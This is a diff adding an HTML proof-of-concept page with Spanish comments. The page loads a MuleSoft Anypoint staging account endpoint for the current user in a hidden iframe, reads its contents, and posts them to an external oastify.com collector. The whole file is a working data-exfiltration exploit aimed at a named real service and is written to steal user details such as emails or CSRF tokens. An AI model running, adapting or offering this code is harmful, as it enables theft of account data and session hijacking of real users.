@@ -1,0 +1,35 @@
+<html>
+<body>
+    <iframe id="secretFrame" src="https://stgx.anypoint.mulesoft.com/accounts/api/users/me" style="display:none;"></iframe>
+    
+    <script>
+      var frame = document.getElementById('secretFrame');
+    
+      // Debemos esperar a que el iframe cargue el contenido interno
+      frame.onload = function() {
+        try {
+          // 1. Acceder al documento interno del iframe
+          var doc = frame.contentDocument || frame.contentWindow.document;
+    
+          // 2. Extraer información específica (ej. un email o un token CSRF)
+          var sensitiveData = doc.body.innerText; 
+          // O algo más específico: doc.querySelector('#email').value;
+    
+          // 3. Exfiltrar los datos a tu servidor
+          fetch('https://0xyb9w7icb1jkh7t8h87w3gqdhj87cv1.oastify.com/collect', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+              data: sensitiveData,
+              url: frame.src
+            })
+          });
+          
+          console.log("Datos extraídos y enviados.");
+        } catch (e) {
+          console.error("Error al acceder al iframe (posible SOP o carga fallida):", e);
+        }
+      };
+    </script>
+</body>
+</html>
